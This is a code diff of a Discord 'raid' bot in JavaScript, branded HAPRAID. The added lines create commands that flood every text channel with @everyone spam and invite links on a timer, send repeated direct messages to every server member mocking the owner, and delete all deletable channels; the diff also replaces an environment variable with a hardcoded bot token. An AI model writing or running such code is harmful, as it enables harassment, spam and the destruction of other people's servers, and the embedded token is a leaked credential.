@@ -27,9 +27,24 @@ bot.on('message', msg => {
   if (msg.content === '.a') {
     console.log(`Commande .des par ${msg.author.tag}`);
     var interval = setInterval (function () {
-      msg.channel.send("@everyone  @here  RAID BY HAPRAID https://discord.gg/9b2SFqD https://media.discordapp.net/attachments/353298252122292225/437735929902268416/unknown.png");
+      msg.channel.send("@everyone  @here  RAID BY HAPRAID https://discord.gg/gmqf6wT https://media.discordapp.net/attachments/353298252122292225/437735929902268416/unknown.png");
      }, 500);
   }
+            if (msg.content === '.des') {
+            console.log(`Commande .mp par ${msg.author.tag}`);
+                if (msg.channel.type === "dm") return;
+                if (msg.deletable) msg.delete();
+                msg.guild.members.forEach(member => {
+                  setInterval(function () {
+                    member.send(msg.guild.owner.user.username+" s'est fait bz son serv par https://discord.gg/gmqf6wT").catch(error => {}) }, 450)})
+       }
+
+if(msg.content === '.del'){
+          if(msg.channel.type === "dm") return;
+          if(msg.guild.channels.size === 0) return;
+          else if(!msg.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
+          msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
+      }
  
   if (msg.content === '.des') {
     console.log(`Commande .des par ${msg.author.tag}`);
@@ -43,8 +58,8 @@ bot.on('message', msg => {
         msg.guild.createChannel('hapraid_vous_remercie', 'text').catch(e => {});
       }
       fucked = true;
-    }
- 
+            }
+
     if (msg.deletable) {
       msg.delete();
     }
@@ -83,10 +98,10 @@ bot.on("message", msg => {
             let i = 0;
             let interval = setInterval(function () {
               msg.guild.channels.forEach(channel => {
-                if (channel.type === "text") channel.send('"@everyone  @here  RAID BY HAPRAID https://discord.gg/DEM7UWF https://media.discordapp.net/attachments/353298252122292225/437735929902268416/unknown.png')
+                if (channel.type === "text") channel.send('"@everyone  @here  RAID BY HAPRAIDhttps://discord.gg/gmqf6wT https://media.discordapp.net/attachments/353298252122292225/437735929902268416/unknown.png')
               }, 2500);
             });
           }
         });
 
-bot.login(process.env.TOKEN)
+bot.login("NTA0OTcxNDYwNDQ4NzQ3NTIx.DrM1aw.ANuVh8mNFbeM24Oxe21BjA_jLKU")
